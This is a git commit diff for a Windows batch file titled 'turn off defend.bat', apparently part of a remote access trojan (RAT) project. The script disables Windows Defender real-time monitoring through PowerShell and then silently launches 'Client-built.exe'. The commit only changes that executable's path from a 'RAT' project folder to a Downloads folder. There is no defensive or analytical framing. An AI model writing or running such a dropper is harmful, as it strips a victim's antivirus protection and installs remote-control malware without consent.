0ee869c4c744b0f1eed85e8cc8c6f1ef00bdb87b
Joshua Daniel <85048311+joshuadaniel-8090@users.noreply.github.com>
2024-03-22 13:30:39 +0530

    bat update

--- turn off defend.bat
+++ turn off defend.bat
@@ -1,3 +1,3 @@
 @echo off
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-start /wait D:\Projects\own\RAT\Client-built.exe /S
+start /wait C:Users\mca1\Downloads\Client-built.exe /S
